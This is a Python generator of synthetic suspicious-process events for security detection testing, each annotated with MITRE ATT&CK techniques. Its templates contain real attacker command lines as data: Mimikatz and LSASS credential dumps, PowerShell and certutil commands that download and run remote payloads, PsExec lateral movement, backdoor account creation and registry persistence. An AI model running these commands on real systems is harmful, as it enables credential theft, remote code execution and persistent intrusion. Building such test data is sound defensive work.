"""Suspicious process execution event generator.

Simulates post-exploitation activity including credential dumping, lateral
movement, and living-off-the-land (LOLBin) techniques.  Each event is
annotated with relevant MITRE ATT&CK® technique IDs.
"""

from __future__ import annotations

import random
import uuid
from datetime import datetime, timezone
from typing import Any, Dict, List

_HOSTNAMES: List[str] = [
    "WORKSTATION-01", "WORKSTATION-42", "LAPTOP-JSMITH",
    "SERVER-DC01", "SERVER-DB02", "DEV-MACHINE-03",
]

_USERNAMES: List[str] = [
    "jsmith", "adm_jones", "SYSTEM", "NT AUTHORITY\\SYSTEM",
    "svc_backup", "svc_deploy", "Administrator",
]

# Each entry: (process_name, process_path, parent_process, command_line, technique_ids, description)
_SUSPICIOUS_PROCESSES: List[Dict[str, Any]] = [
    {
        "process_name": "mimikatz.exe",
        "process_path": "C:\\Users\\Public\\mimikatz.exe",
        "parent_process": "cmd.exe",
        "command_line": "mimikatz.exe sekurlsa::logonpasswords exit",
        "technique_ids": ["T1003.001"],
        "description": "Credential dumping via Mimikatz sekurlsa",
        "severity": "critical",
    },
    {
        "process_name": "mimikatz.exe",
        "process_path": "C:\\Temp\\m64.exe",
        "parent_process": "powershell.exe",
        "command_line": "m64.exe lsadump::sam /patch",
        "technique_ids": ["T1003.002"],
        "description": "SAM database credential dump",
        "severity": "critical",
    },
    {
        "process_name": "procdump.exe",
        "process_path": "C:\\Windows\\Temp\\procdump.exe",
        "parent_process": "cmd.exe",
        "command_line": "procdump.exe -ma lsass.exe C:\\Temp\\lsass.dmp",
        "technique_ids": ["T1003.001"],
        "description": "LSASS memory dump via ProcDump",
        "severity": "critical",
    },
    {
        "process_name": "powershell.exe",
        "process_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "parent_process": "winword.exe",
        "command_line": (
            "powershell.exe -NoP -NonI -W Hidden -Exec Bypass "
            "-EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYw"
        ),
        "technique_ids": ["T1059.001", "T1027"],
        "description": "Encoded PowerShell download cradle spawned from Office",
        "severity": "critical",
    },
    {
        "process_name": "powershell.exe",
        "process_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "parent_process": "cmd.exe",
        "command_line": (
            "powershell -c \"IEX (New-Object Net.WebClient)"
            ".DownloadString('http://192.168.56.1/payload.ps1')\""
        ),
        "technique_ids": ["T1059.001", "T1105"],
        "description": "PowerShell download cradle (IEX WebClient)",
        "severity": "high",
    },
    {
        "process_name": "psexec.exe",
        "process_path": "C:\\Windows\\Temp\\psexec.exe",
        "parent_process": "cmd.exe",
        "command_line": "psexec.exe \\\\192.168.1.50 -u Administrator -p P@ssw0rd cmd.exe",
        "technique_ids": ["T1021.002"],
        "description": "PsExec lateral movement",
        "severity": "high",
    },
    {
        "process_name": "wmic.exe",
        "process_path": "C:\\Windows\\System32\\wbem\\wmic.exe",
        "parent_process": "cmd.exe",
        "command_line": (
            "wmic /node:192.168.1.55 process call create "
            "\"cmd.exe /c whoami > C:\\Temp\\out.txt\""
        ),
        "technique_ids": ["T1021.003", "T1047"],
        "description": "WMIC remote process creation for lateral movement",
        "severity": "high",
    },
    {
        "process_name": "cmd.exe",
        "process_path": "C:\\Windows\\System32\\cmd.exe",
        "parent_process": "svchost.exe",
        "command_line": "cmd.exe /c net user backdoor P@ssw0rd! /add && net localgroup administrators backdoor /add",
        "technique_ids": ["T1136.001"],
        "description": "Local account creation for persistence",
        "severity": "high",
    },
    {
        "process_name": "reg.exe",
        "process_path": "C:\\Windows\\System32\\reg.exe",
        "parent_process": "powershell.exe",
        "command_line": (
            "reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run "
            "/v Updater /t REG_SZ /d C:\\Temp\\payload.exe /f"
        ),
        "technique_ids": ["T1547.001"],
        "description": "Registry run key persistence",
        "severity": "high",
    },
    {
        "process_name": "certutil.exe",
        "process_path": "C:\\Windows\\System32\\certutil.exe",
        "parent_process": "cmd.exe",
        "command_line": "certutil.exe -urlcache -split -f http://10.10.10.5/shell.exe C:\\Temp\\shell.exe",
        "technique_ids": ["T1105", "T1140"],
        "description": "CertUtil used to download and decode remote payload",
        "severity": "high",
    },
]


def _now_iso() -> str:
    return datetime.now(timezone.utc).isoformat(timespec="seconds")


def generate_suspicious_process(count: int = 1) -> List[Dict[str, Any]]:
    """Generate *count* suspicious process execution events.

    Each event includes MITRE ATT&CK technique IDs and realistic Windows
    process metadata.

    Parameters
    ----------
    count:
        Number of events to generate.

    Returns
    -------
    List[Dict[str, Any]]
    """
    events: List[Dict[str, Any]] = []
    for _ in range(count):
        template = random.choice(_SUSPICIOUS_PROCESSES)
        event: Dict[str, Any] = {
            "event_id": str(uuid.uuid4()),
            "timestamp": _now_iso(),
            "hostname": random.choice(_HOSTNAMES),
            "username": random.choice(_USERNAMES),
            "process_name": template["process_name"],
            "process_path": template["process_path"],
            "parent_process": template["parent_process"],
            "command_line": template["command_line"],
            "pid": random.randint(1000, 65535),
            "ppid": random.randint(400, 999),
            "severity": template["severity"],
            "event_type": "suspicious_process",
            "description": template["description"],
            "mitre_technique_ids": template["technique_ids"],
            "mitre_tactic": _tactic_from_technique(template["technique_ids"][0]),
        }
        events.append(event)
    return events


def _tactic_from_technique(technique_id: str) -> str:
    """Map technique ID prefix to ATT&CK tactic name."""
    _map: Dict[str, str] = {
        "T1003": "Credential Access",
        "T1059": "Execution",
        "T1021": "Lateral Movement",
        "T1047": "Execution",
        "T1105": "Command and Control",
        "T1027": "Defense Evasion",
        "T1136": "Persistence",
        "T1547": "Persistence",
        "T1140": "Defense Evasion",
    }
    base = technique_id.split(".")[0]
    return _map.get(base, "Unknown")
